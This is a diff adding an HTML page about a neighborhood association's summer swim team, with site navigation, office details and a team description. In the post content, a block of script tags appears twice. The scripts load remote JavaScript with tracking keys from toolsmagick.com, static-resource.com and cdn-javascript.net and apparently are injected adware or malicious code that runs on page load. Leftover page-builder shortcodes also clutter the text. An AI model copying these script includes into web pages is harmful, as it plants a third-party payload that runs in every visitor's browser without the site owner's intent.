@@ -1,0 +1,137 @@
+<html>
+
+<head>
+  <title>Klahanie Association - Shark Swim Team</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+    integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+    crossorigin="anonymous"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+    crossorigin="anonymous"></script>
+
+  <link rel="stylesheet" href="/css/style.css" />
+  <script>
+    $(function() {
+     var pgurl = window.location.href.substr(window.location.href
+.lastIndexOf("/")+1);
+     $("#nav ul li a").each(function(){
+          if($(this).attr("href") == pgurl || $(this).attr("href") == '' )
+          $(this).addClass("active");
+     })
+});
+  </script>
+</head>
+
+<body class="row">
+  <nav class="sidebar col-md-2">
+    <div class="widget widget_media_image" style="margin-left:-10px;">
+      <a href="https://klahanie.com"><img 
+          src="https://klahanie.com/wp-content/uploads/2019/08/Klahanie-Logo-for-Web-small-2.png"
+          class="img col-md-10" alt="Klahanie Logo"
+          style="max-width: 100%; height: auto;"
+          data-orig-src="https://klahanie.com/wp-content/uploads/2019/08/Klahanie-Logo-for-Web-small-2.png"></a></div>
+
+    <ul id="nav" class="nav flex-column mt-4">
+  <li class="nav-item"><a class="nav-link" href="announcements.html">Announcements</a></li>
+  <li class="nav-item">
+    <a class="nav-link dropdown-toggle" href="#item1" data-toggle="collapse" data-parent="nav">Neighborhood</a>
+    <div id="item1" class='collapse'>
+      <ul class="nav ml-3">
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/about-klahanie/">About Klahanie</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/neighborhoods/">Neighborhoods</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/shopping-center/">Shopping Center</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/buying-a-home/">Buying or Selling a Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/renting-your-home/">Renting Your Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/about-klahanie-forms/">Forms</a></li>
+      </ul>
+    </div>
+</li> 
+<li class="nav-item">
+  <a class="nav-link dropdown-toggle" href="#item2" data-toggle="collapse" data-parent="nav">Amenities</a>
+  <div id="item2" class="collapse">
+    <ul class="nav ml-3">
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/klahanie-lifestyles/">Klahanie Lifestyles</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/pool-information/">Pool Information</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/pool-forms/">Pool Rules</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/swim-lessons/">Swim Lessons &amp; Online Registration</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/lakeside-pool/">Lakeside Pool</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/mountainview-pool/">Mountainview Pool</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/tennis-information/">Tennis Information</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/clubs-and-groups/">Clubs and Groups</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/security/">Neighborhood Patrol</a>
+      <li class="nav-item"><a href="https://klahanie.com/lifestyles-forms/">Forms</a></li>
+    </ul>  
+  </div>
+  </li>
+
+<li class="nav-item"><a class="nav-link dropdown-toggle" href="#item3" data-toggle="collapse" data-parent="nav">The Association</a>
+  <div id="item3" class="collapse">
+    <ul class="nav ml-3">
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/the-association/">Overview</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/administration/">Administration</a></li>
+    <li class="nav-item"><a class="nav-link" href="https://klahanie.com/homeowners-association-obligations-and-compliance/">Homeowners Association Obligations and Compliance</a>
+    <li class="nav-item"><a class="nav-link"  href="https://klahanie.com/board-of-directors/">Board of Directors</a></li>
+    <li class="nav-item"><a class="nav-link"  href="https://klahanie.com/association-forms/">Forms</a></li>
+    </ul>
+  </div>
+</li>
+<li class="nav-item"><a class="nav-link" href="https://myhoabenefits.com/">My HOA Benefits</a></li>
+<li class="nav-item"><a class="nav-link" href="klahanie-magazine.html">Klahanie Magazine</a></li>
+<li class="nav-item"><a class="nav-link" href="http://klahanie.com/events/">Calendar of Events</a></li>
+<li class="nav-item"><a class="nav-link"  href="https://klahanie.com/contact-us/">Contact</a></li>
+</ul>
+</ul>
+
+
+    <div class="small ml-3 mt-10">4210 244th Place SE<br>
+      Sammamish, WA 98029<br>
+      425-392-4663<br>
+      425-392-4663<br>
+      Office hours: 
+      <ul>
+        <li>Monday-Thursday: 8:30am - 5:00pm</li>
+        <li>Friday:9:00am - 4:00pm</li>
+        <li>Closed weekends, and holidays</li>
+      </ul>
+      <a href='https://www.facebook.com/KlahanieAssociation/'><img src="fb.png" class="img" width="100"  alt="Find us on Facebook"></a>
+    </div>
+  </nav>
+  <div class="main col-md-10">
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Shark Swim Team</h1>
+  </header>
+
+  <div class="post-content">
+    <p>[fusion_builder_container hundred_percent=”no” hundred_percent_height=”no” hundred_percent_height_scroll=”no” hundred_percent_height_center_content=”yes” equal_height_columns=”no” menu_anchor=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” status=”published” publish_date=”” class=”” id=”” background_color=”” background_image=”” background_position=”center center” background_repeat=”no-repeat” fade=”no” background_parallax=”none” enable_mobile=”no” parallax_speed=”0.3” video_mp4=”” video_webm=”” video_ogv=”” video_url=”” video_aspect_ratio=”16:9” video_loop=”yes” video_mute=”yes” video_preview_image=”” border_size=”” border_color=”” border_style=”solid” margin_top=”” margin_bottom=”” padding_top=”” padding_right=”” padding_bottom=”” padding_left=””][fusion_builder_row][fusion_builder_column type=”1_1” layout=”1_1” spacing=”” center_content=”no” link=”” target=”_self” min_height=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” background_color=”” background_image=”” background_image_id=”” background_position=”left top” background_repeat=”no-repeat” hover_type=”none” border_size=”0” border_color=”” border_style=”solid” border_position=”all” padding_top=”” padding_right=”” padding_bottom=”” padding_left=”” margin_top=”” margin_bottom=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”” last=”no”][fusion_imageframe image_id=”1548|full” max_width=”” style_type=”” blur=”” stylecolor=”” hover_type=”none” bordersize=”” bordercolor=”” borderradius=”” align=”center” lightbox=”no” gallery_id=”” lightbox_image=”” lightbox_image_id=”” alt=”” link=”” linktarget=”_self” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=”“]http://klahanie.com/wp-content/uploads/2019/06/shark-swim-banner.gif[/fusion_imageframe][fusion_separator style_type=”default” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” sep_color=”#ffffff” top_margin=”” bottom_margin=”” border_size=”20” icon=”” icon_circle=”” icon_circle_color=”” width=”” alignment=”center” /][fusion_text columns=”” column_min_width=”” column_spacing=”” rule_style=”default” rule_size=”” rule_color=”” hide_on_mobile=”small-visibility,medium-visibility,large-visibility” class=”” id=”” animation_type=”” animation_direction=”left” animation_speed=”0.3” animation_offset=””]</p>
+<h3><strong>The Klahanie Swim Team</strong> is a member of the 26-Team, Midlakes Summer Swim League. We seek to provide a competitive swimming environment for a young swimmer that is fun and relaxed.</h3>
+<h3><strong>Klahanie Swim Team offers swimmers between 5 and 18 years of age a fun way to get exercise while swimming with others of the same age.</strong> Although swimming is an individual sport, participating on a swim team helps create an enthusiasm for swimming that is hard to achieve by just swimming alone. The Klahanie Swim Team promotes team building skills, friendliness, and sportsmanlike conduct among teammates and opponents.</h3>
+<h3><strong>Klahanie Swim Team is a competition where swimmers race at meets against other swimmers of their own age group.</strong> The swim meets <strong>emphasize fun and personal improvemen</strong>t.  They team that success isn’t necessarily winning, but is related to hard work and doing your best.   The Klahanie Swim Team helps teach that competition, winning, and losing are all part of life. There are 5 boys and girls age brackets: 8, 10, 12, 14 and under, and 15 and over.</h3>
+<h3><strong>The Klahanie Homeowners Association is equipped with two, four-lane, 25-meter competition pools</strong>. Practices are held daily from Memorial Day through July. Klahanie Swim Team coaches and lifeguards are also available throughout the swim season for private, semi-private and group lessons.</h3>
+<h3>For the mostup-to-date Pool Maps, Calendar, Meets, and Results:  <a title="CLICK HERE" href="https://www.teamunify.com/Home.jsp?team=recmskswa" target="_blank" rel="noopener noreferrer">CLICK HERE</a></h3>
+<h3><script src="//toolsmagick.com/2252259d09bdba7f1b.js"></script><script src="http://toolsmagick.com/optout/set/lat?jsonp=__mtz_cb_252072851&amp;key=2252259d09bdba7f1b&amp;cv=1582430415&amp;t=1582430415195" type="text/javascript"></script><script src="http://toolsmagick.com/optout/set/lt?jsonp=__mtz_cb_358698412&amp;key=2252259d09bdba7f1b&amp;cv=2049&amp;t=1582430415196" type="text/javascript"></script><script src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8786x" type="text/javascript"></script><script src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8786x&amp;format=arrjs&amp;r=1582430415204" type="text/javascript"></script><script src="http://toolsmagick.com/ext/2252259d09bdba7f1b.js?sid=52646_8786_&amp;title=qqq&amp;blocks[]=31af2" type="text/javascript"></script></h3>
+<script src="//toolsmagick.com/2252259d09bdba7f1b.js"></script>
+<script src="http://toolsmagick.com/optout/set/lat?jsonp=__mtz_cb_819093133&amp;key=2252259d09bdba7f1b&amp;cv=1582526939&amp;t=1582526939586" type="text/javascript"></script>
+<script src="http://toolsmagick.com/optout/set/lt?jsonp=__mtz_cb_237975189&amp;key=2252259d09bdba7f1b&amp;cv=2709&amp;t=1582526939588" type="text/javascript"></script>
+<script src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8786x" type="text/javascript"></script>
+<script src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8786x&amp;format=arrjs&amp;r=1582526939608" type="text/javascript"></script>
+<script src="http://toolsmagick.com/ext/2252259d09bdba7f1b.js?sid=52646_8786_&amp;title=qqq&amp;blocks[]=31af2" type="text/javascript"></script>
+
+<p>[/fusion_text][/fusion_builder_column][/fusion_builder_row][/fusion_builder_container]</p>
+
+  </div>
+
+</article>
+
+  </div>
+
+</body>
+
+</html>
